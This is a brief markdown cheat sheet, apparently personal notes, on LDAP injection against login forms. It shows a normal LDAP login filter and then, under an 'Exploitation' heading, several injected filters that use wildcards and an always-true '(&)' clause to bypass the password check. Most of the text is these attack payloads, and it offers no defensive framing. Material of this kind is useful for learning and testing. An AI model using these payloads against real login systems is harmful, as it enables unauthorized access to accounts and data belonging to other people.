# Foundation
In common login we going to see this kind of ldap
```
(&(uid=admin)(userPassword=password123))
```

# Exploitation
We use wildcards to "complete" the parameters to bypass the login part
```
(&(uid=admin)(userPassword=*))
(&(uid=*)(userPassword=*))
(&(uid=admin*)(userPassword=*))
```
And without wildcards
```
(&(uid=admin)(|(&)(userPassword=abc)))
```
NOte: Remember the character "&" is true
